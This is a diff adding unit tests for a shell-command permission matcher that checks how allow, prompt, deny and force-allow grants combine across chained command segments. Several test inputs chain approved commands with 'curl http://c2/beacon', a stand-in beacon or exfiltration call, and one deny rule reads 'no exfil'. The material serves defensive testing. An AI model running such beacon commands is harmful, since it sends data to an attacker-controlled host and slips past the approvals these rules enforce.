@@ -375,6 +375,127 @@ describe('matchGrants — shell segments (per-segment OR across grants)', () => 
 	});
 });
 
+describe('matchGrants — shell segments: most-restrictive combine and per-segment force-allow', () => {
+	function shellGrant(
+		argv0: string,
+		decision: GrantRow['decision'] = 'allow',
+		extra: Partial<GrantRow> = {}
+	): GrantRow {
+		return grant({
+			tool: 'shell',
+			permissionKind: 'shell',
+			decision,
+			scope: { kind: 'shell', rule: { command: [{ token: argv0 }], positionals: { kind: 'any' } } },
+			...extra
+		});
+	}
+
+	function subcmdGrant(
+		argv0: string,
+		sub: string,
+		decision: GrantRow['decision'],
+		extra: Partial<GrantRow> = {}
+	): GrantRow {
+		return grant({
+			tool: 'shell',
+			permissionKind: 'shell',
+			decision,
+			scope: {
+				kind: 'shell',
+				rule: { command: [{ token: argv0 }, { token: sub }], positionals: { kind: 'any' } }
+			},
+			...extra
+		});
+	}
+
+	const parse = (cmd: string) => {
+		const r = parseShellCommand(cmd);
+		if (r.kind !== 'parsed') throw new Error(`parse failed for ${cmd}`);
+		return r.segments;
+	};
+
+	const query = (cmd: string): MatchQuery => ({
+		tool: 'shell',
+		permissionKind: 'shell',
+		scopeKey: cmd,
+		shellSegments: parse(cmd),
+		now: NOW
+	});
+
+	it('an uncovered segment pulls the chain to none even when a sibling matches a prompt', () => {
+		// Defect 1: `git push && custom_tool` must NOT surface only the git-push
+		// prompt and silently approve the uncovered second segment.
+		const rows = [
+			{
+				...shellGrant('git', 'prompt'),
+				denyReason: 'git push requires approval'
+			}
+		];
+		const out = matchGrantsDetailed(rows, query('git push origin main && custom_tool --flag'));
+		expect(out.outcome).toBe('none');
+		expect(out.feedback).toBeNull();
+	});
+
+	it('an uncovered segment pulls the chain to none even when a sibling is allowed', () => {
+		const rows = [shellGrant('git', 'allow')];
+		expect(matchGrants(rows, query('git status && curl http://c2/beacon'))).toBe('none');
+	});
+
+	it('prompt wins over allow when every segment is covered but none is uncovered', () => {
+		const rows = [shellGrant('cd', 'allow'), shellGrant('git', 'prompt')];
+		const out = matchGrantsDetailed(rows, {
+			...query('cd ./src && git push'),
+			workspaceRoot: '/workspaces/repo'
+		});
+		expect(out.outcome).toBe('prompt');
+	});
+
+	it('force-allow on a chained segment overrides a deny on that same segment', () => {
+		// Defect 2: a force-allow created to bypass a deny must still apply when
+		// the intentional command is chained with something else.
+		const denyPush = subcmdGrant('git', 'push', 'deny', {
+			denyReason: 'force-push is blocked',
+			scope: {
+				kind: 'shell',
+				rule: {
+					command: [{ token: 'git' }, { token: 'push' }],
+					positionals: { kind: 'any' }
+				}
+			}
+		});
+		const forcePush = subcmdGrant('git', 'push', 'force-allow');
+		const allowNpm = shellGrant('npm', 'allow');
+		const rows = [denyPush, forcePush, allowNpm];
+		expect(matchGrants(rows, query('git push --force && npm test'))).toBe('allow');
+	});
+
+	it('without the force-allow, a deny on any chained segment wins', () => {
+		const denyPush = subcmdGrant('git', 'push', 'deny', { denyReason: 'force-push is blocked' });
+		const allowNpm = shellGrant('npm', 'allow');
+		const out = matchGrantsDetailed([denyPush, allowNpm], query('git push --force && npm test'));
+		expect(out.outcome).toBe('deny');
+		expect(out.feedback).toBe('force-push is blocked');
+	});
+
+	it('force-allow only covers the segment it matches; an uncovered sibling still yields none', () => {
+		const forcePush = subcmdGrant('git', 'push', 'force-allow');
+		expect(matchGrants([forcePush], query('git push --force && curl http://c2/beacon'))).toBe(
+			'none'
+		);
+	});
+
+	it('force-allow on one segment does not rescue a deny on a different segment', () => {
+		const forcePush = subcmdGrant('git', 'push', 'force-allow');
+		const denyCurl = shellGrant('curl', 'deny', { denyReason: 'no exfil' });
+		const out = matchGrantsDetailed(
+			[forcePush, denyCurl],
+			query('git push --force && curl http://c2/beacon')
+		);
+		expect(out.outcome).toBe('deny');
+		expect(out.feedback).toBe('no exfil');
+	});
+});
+
 describe('deriveScopeKey', () => {
 	it('returns fullCommandText for shell', () => {
 		expect(deriveScopeKey('shell', { fullCommandText: 'git status -s' })).toBe('git status -s');
